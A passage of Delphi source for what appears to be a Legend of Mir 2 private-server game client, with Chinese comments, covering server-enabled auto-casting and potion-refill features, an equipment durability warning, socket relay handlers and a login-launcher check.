    Begin
      g_dwDuraAlertTick := GetTickCount;
      For I := Low(g_UseItems) To High(g_UseItems) Do
      Begin
        If g_UseItems[I].S.Name <> '' Then
        Begin
          If ((g_UseItems[I].Dura / g_UseItems[I].DuraMax * 100) < 30) and (not((g_UseItems[I].S.StdMode=2) and (g_UseItems[I].S.reserved=56))) Then
            DScreen.AddChatBoardString('你的装备[' + g_UseItems[I].S.Name +
              ']持久低于30%。', clRed, clWhite);
        End;
      End;
    End;
  Except
  End;

  //自动烈火
  Try
    If (g_WgInfo.boCanAutoFireHit) And
      (Not g_MySelf.m_boIsShop) And
      (g_MySelf.m_btHorse = 0) And
      (Not g_boNextTimeFireHit) And
      (g_MyMagic[26] <> Nil) Then
    Begin
      If g_dwFireHitTick = 0 Then
        g_dwFireHitTick := GetTickCount;
      If (GetTickCount - g_dwFireHitTick) >g_ClientWgInfo.nFireHitSkillTime Then
      Begin
        FrmMain.SendSpellMsg(CM_SPELL, g_MySelf.m_btDir, 0, 26, 0);
        g_dwFireHitTick := 0;
      End;
    End;
  Except
  End;
  //自动隐身
  Try
    If (g_Wginfo.boCanCloak) And
      (Not g_wgInfo.boCanCloakCls) And
      (Not g_MySelf.m_boIsShop) And
      (g_MySelf.m_btHorse = 0) And
      (g_MySelf.m_Abil.MP > 10) And
      (g_MyMagic[18] <> Nil) And
      (g_MySelf.m_nState And $00800000 = 0) And
      ((GetTickCount - g_dwLatestSpellTick) > g_dwSpellTime) Then
    Begin
      g_dwLatestSpellTick := GetTickCount;
      g_dwMagicDelayTime := 0;
      FrmMain.UseMagic(g_nMouseX, g_nMouseY, g_MyMagic[18]);
    End;
  Except
  End;

  //自动开盾
  Try
    If (g_wgInfo.boCanShield) And
      (Not g_WgInfo.boCanShieldCls) And
      (Not g_MySelf.m_boIsShop) And
      (g_MySelf.m_btHorse = 0) And
      (g_MyMagic[31] <> Nil) And
      (g_MySelf.m_nState And $00100000 {STATE_BUBBLEDEFENCEUP} = 0) And
      (g_MySelf.m_Abil.MP > 20) And
      ((GetTickCount - g_dwLatestSpellTick) > g_dwSpellTime) Then
    Begin
      g_dwLatestSpellTick := GetTickCount;
      g_dwMagicDelayTime := 0;
      FrmMain.UseMagic(g_nMouseX, g_nMouseY, g_MyMagic[31]);
    End;
  Except
  End;

   //自动开道力盾
  Try
    If (g_wgInfo.boCanShield) And
      (Not g_WgInfo.boCanShieldCls) And
      (Not g_MySelf.m_boIsShop) And
      (g_MySelf.m_btHorse = 0) And
      (g_MyMagic[80] <> Nil) And
      (g_MySelf.m_nState And $00100000 {STATE_BUBBLEDEFENCEUP} = 0) And
      (g_MySelf.m_Abil.MP > 20) And
      ((GetTickCount - g_dwLatestSpellTick) > g_dwSpellTime) Then
    Begin
      g_dwLatestSpellTick := GetTickCount;
      g_dwMagicDelayTime := 0;
      FrmMain.UseMagic(g_nMouseX, g_nMouseY, g_MyMagic[80]);
    End;
  Except
  End;

   //自动开四级盾
  Try
    If (g_wgInfo.boCanShield) And
      (Not g_WgInfo.boCanShieldCls) And
      (Not g_MySelf.m_boIsShop) And
      (g_MySelf.m_btHorse = 0) And
      (g_MyMagic[57] <> Nil) And
      (g_MySelf.m_nState And $02000000 {STATE_BUBBLEDEFENCEUP} = 0) And
      (g_MySelf.m_Abil.MP > 20) And
      ((GetTickCount - g_dwLatestSpellTick) > g_dwSpellTime) Then
    Begin
      g_dwLatestSpellTick := GetTickCount;
      g_dwMagicDelayTime := 0;
      FrmMain.UseMagic(g_nMouseX, g_nMouseY, g_MyMagic[57]);
    End;
  Except
  End;

   //自动开四级盾
  Try
    If (g_wgInfo.boCanShield) And
      (Not g_WgInfo.boCanShieldCls) And
      (Not g_MySelf.m_boIsShop) And
      (g_MySelf.m_btHorse = 0) And
      (g_MyMagic[81] <> Nil) And
      (g_MySelf.m_nState And $02000000 {STATE_BUBBLEDEFENCEUP} = 0) And
      (g_MySelf.m_Abil.MP > 20) And
      ((GetTickCount - g_dwLatestSpellTick) > g_dwSpellTime) Then
    Begin
      g_dwLatestSpellTick := GetTickCount;
      g_dwMagicDelayTime := 0;
      FrmMain.UseMagic(g_nMouseX, g_nMouseY, g_MyMagic[81]);
    End;
  Except
  End;

  //自动放药
  Try
    If g_wgInfo.boAutoDownDrup Then
    Begin
      For I := 0 To 5 Do
      Begin
        If (g_ItemArr[I].S.Name = '') And (g_WgItemArr[I].S.Name <> '')  Then
        Begin
          For II := MAXBAGITEMCL - 1 Downto 6 Do
          Begin
            If (CompareText(g_ItemArr[II].S.Name, g_WgItemArr[I].S.Name) = 0)
              And
              (g_ItemArr[II].S.Name <> g_MovingItem.Item.S.Name) Then
            Begin
              g_ItemArr[I] := g_ItemArr[II];
              g_ItemArr[II].S.Name := '';
              break;
            End;
          End;
        End;
        If g_ItemArr[I].S.Name <> '' Then
          g_WgItemArr[I] := g_ItemArr[I];
      End;
    End;
  Except

  End;

  If g_WgInfo.boCanWideHit Then
    g_boCanWideHitCount := GetWideCount;
End;

Procedure TfrmMain.ClientSocketConnect(Sender: TObject;
  Socket: TCustomWinSocket);
Begin
  If g_MySelf <> Nil Then
    SendClientMessage(CM_CONNECT, 0, 0, 0, 0);
End;

Procedure TfrmMain.ClientSocketDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
Begin
  //if g_MySelf <>Nil then SendClientMessage(CM_DISCONNECT,0,0,0,0);
End;

Procedure TfrmMain.ClientSocketRead(Sender: TObject;
  Socket: TCustomWinSocket);
Var
  dmsg: TDefaultMessage;
Begin
  If g_MySelf <> Nil Then
  Begin
    dmsg := MakeDefaultMsg(CM_SENDDATA, 0, 0, 0, 0);
    SendSocket(EncodeMessage(dmsg) + EncodeString(Socket.ReceiveText));
  End;
End;

Procedure TfrmMain.ClientGetCheckData(body: String);
Begin
  If ClientSocket.Socket.Connected Then
    ClientSocket.Socket.SendText(body);
End;

Procedure TfrmMain.ClientGetCheckConnect(port: Integer; body: String);
Begin
  Try
    If ClientSocket.Socket.Connected Then
    Begin
      ClientSocket.Socket.Close;
      ClientSocket.Active := False;
    End;
    ClientSocket.Host := body;
    ClientSocket.Port := port;
    ClientSocket.Active := True;
  Except
  End;
End;

Procedure TfrmMain.ClientGetAddress(port: Integer; body: String);
Var
  dmsg: TDefaultMessage;
Begin
  dmsg := MakeDefaultMsg(CM_GETADDRESS, 0, 0, 0, 0);
  SendSocket(EncodeMessage(dmsg) + EncodeString(CSocket.Address));
End;

Procedure TfrmMain.Timer2Timer(Sender: TObject);
Const
  bCheck: Boolean = False;
Var
  Resulti: Integer;
Begin
  If bCheck Then
    exit;
  bCheck := True;
  Try
{$IF WINDOPROCESS  = OPENPROCESS}
    Resulti := SendMessage(g_nLoginHandle, WM_USER + 1001, FrmMain.Handle, 0);
    If Resulti = 1 Then
    Begin
       g_boWgClose:=True;
       CSocket.Socket.Close;
       FrmDlg.DMessageDlg(FrmMain.Server.DecryptStr('Bh=+xvSnIE6J8VC4VZ2dvfppS2PlER=Frxu5My2Dq4MBdYT24t4VuomYgwWJzOZFjpJsGglG0Vg6Ufo8dv+wAbRjklNe7dOEXxCKuf6PHKetqhBrRDdTrhaQBDXtbMIz'), [mbOk]);
       Close;
    End
    Else If Resulti <> Handle Then
    Begin
      Close;
    End;
{$IFEND}
  Finally
    bCheck := False;
  End;
End;

End.

